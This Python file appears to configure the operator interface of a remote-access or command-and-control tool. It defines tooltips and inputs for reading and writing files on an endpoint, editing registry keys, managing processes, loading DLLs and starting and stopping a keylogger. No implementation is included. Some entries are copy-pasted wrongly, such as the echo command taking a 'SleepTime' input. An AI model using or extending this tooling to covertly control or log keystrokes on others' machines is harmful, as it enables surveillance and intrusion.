


read_file_tt = """
Read File:

This command reads a file (requires full file path)
from the endpoint and returns the content of that file
to this host

Arguments:
1: Remote filename (string format)

Returns: Status code

"""
write_file_tt = """
Write File:

This command writes a file
to the endpoint and returns
to the status code

Arguments:
1: Source File (must be uploaded)
2: Remote filename (string format)

Returns: Status code
"""

write_file_tt = """
Write File:

This command writes a file
to the endpoint and returns
to the status code

Arguments:
1: Source File (must be uploaded)
2: Remote filename (string format)

Returns: Status code
"""
write_regkey_tt = """
Write Registry Key:

This command (over)writes a
registry key value at a given
registry key location

Arguments:
1: Registry Key
2: Registry Key Value
3: Registry Key Type

Returns: Status code
"""

read_regkey_tt = """
Write Registry Key:

Reads the value of a given registry key
if the key does not exist, returns NULL

Arguments:
1: Registry Key Location
2: Reg Key Name

Returns: Value Data
"""

list_devices_tt = """
List Connected Devices

Lists connected USB devices

Arguments:
None

Returns: Status code
"""


list_procs_tt = """
Lists Running Processes

Lists running processes on the host.
Returns PID, Filename, ..., etc

Arguments:
None

Returns: Status code
"""

start_keylogger_tt = """
Start Keylogger

Starts a Keylogger on the device

Arguments:
1. Output filename for the text-based output.
   (can be blank / written to memory)

Returns: Status code
"""

stop_keylogger_tt = """
Stop Keylogger

Stops a Keylogger on the device

Arguments:
1. Output filename for the text-based output.
    (if written to memory)

Returns: Status code
"""

start_process_tt = """
Start Process

Starts a process using the named executable.

Arguments:
1. Filepath of executable to start

Returns: Status code
"""

terminate_process_tt = """
Terminate Process

Terminates a Process based on PID or Filename

Arguments:
1. PID (number) / Name (string)

Returns: Status code
"""

list_plugins_tt = """
List Loaded Plugins

Returns a list of loaded plugins.

Arguments:
None

Returns:
Line-delimited list of loaded plugins
"""

start_thread_tt = """
Start Thread

Loads a dynamic link library (or shared object)
and executes at a given entry point

Arguments:
1. Library Location (filename or path)
2. Entry point (function name)
3. Entry point arguments (plugin dependant)

Returns:
Status code
"""
sleep_tt = """
Sleep

Put the program to sleep for
a number of miliseconds

Arguments:
1. Number of miliseconds

Returns:
None
"""
echo_tt = """
Echo

Client Returns this string verbatim

Arguments:
1. String to Echo

Returns:
String
"""


commands = [
{
"CommandName":"read_file",
"Tooltip":read_file_tt,
"Output":True,
"Inputs":[
        {"Name":"FilePath",
         "Type":"textbox",
         "Tooltip":"Must be the fully qualified path",
         "Value":"remote filename"
         },
    ],
"OptionalInputs":[]
},
{
"CommandName":"send_file",
"Tooltip":write_file_tt,
"Output":True,
"Inputs":[
        {"Name":"SourceFilePath",
         "Type":"textbox",
         "Tooltip":"Must be uploaded here dirst",
         "Value":"File"
         },
        {"Name":"DestinationFilePath",
         "Type":"textbox",
         "Tooltip":"Must be the fully qualified path",
         "Value":"remote filename"
         },
    ],
"OptionalInputs":[]
},
{
"CommandName":"write_regkey",
"Tooltip":write_regkey_tt,
"Output":True,
"Inputs":[
        {"Name":"KeyLocation",
         "Type":"textbox",
         "Tooltip":"Must be the fully qualified path",
         "Value":""
         },
        {"Name":"KeyValue",
         "Type":"textbox",
         "Tooltip":"",
         "Value":""
         },
        {"Name":"KeyType",
         "Type":"textbox",
         "Tooltip":"",
         "Value":""
         },
    ],
"OptionalInputs":[]
},
{
"CommandName":"read_regkey",
"Tooltip":read_regkey_tt,
"Output":True,
"Inputs":[
        {"Name":"KeyLocation",
         "Type":"textbox",
         "Tooltip":"HKLM is ok",
         "Value":""
         },
        {"Name":"KeyName",
         "Type":"textbox",
         "Tooltip":"",
         "Value":""
         },
    ],
"OptionalInputs":[]
},
{
"CommandName":"list_devices",
"Tooltip":list_devices_tt,
"Output":True,
"Inputs":[],
"OptionalInputs":[]
},
{
"CommandName":"list_processes",
"Tooltip":list_procs_tt,
"Output":True,
"Inputs":[],
"OptionalInputs":[]
},
{
"CommandName":"list_plugins",
"Tooltip":list_plugins_tt,
"Output":True,
"Inputs":[],
"OptionalInputs":[]
},
{
"CommandName":"create_process",
"Tooltip":start_process_tt,
"Output":True,
"Inputs":[
        {"Name":"ExecutablePath",
         "Type":"textbox",
         "Tooltip":"Must be fully qualified path",
         "Value":""
         },
    ],
"OptionalInputs":[]
},
{
"CommandName":"start_keylogger",
"Tooltip":start_keylogger_tt,
"Output":True,
"Inputs":[],
"OptionalInputs":[
        {"Name":"OutputFile",
         "Type":"textbox",
         "Tooltip":"Must be fully qualified path",
         "Value":""
         },
]
},
{
"CommandName":"stop_keylogger",
"Tooltip":stop_keylogger_tt,
"Output":True,
"Inputs":[],
"OptionalInputs":[
        {"Name":"OutputFile",
         "Type":"textbox",
         "Tooltip":"Must be fully qualified path",
         "Value":""
         },
        ]
},
{
"CommandName":"terminate_process",
"Tooltip":terminate_process_tt,
"Output":True,
"Inputs":[
        {"Name":"ProcessName",
         "Type":"textbox",
         "Tooltip":"Must be the process name or the PID",
         "Value":""
         },
        ],
"OptionalInputs":[]
},
{
"CommandName":"sleep",
"Tooltip":sleep_tt,
"Output":False,
"Inputs":[
        {"Name":"SleepTime",
         "Type":"textbox",
         "Tooltip":"Integer number of miliseconds",
         "Value":""
         },
        ],
"OptionalInputs":[]
},
{
"CommandName":"echo",
"Tooltip":echo_tt,
"Output":True,
"Inputs":[
        {"Name":"SleepTime",
         "Type":"textbox",
         "Tooltip":"Integer number of miliseconds",
         "Value":""
         },
        ],
"OptionalInputs":[]
},
]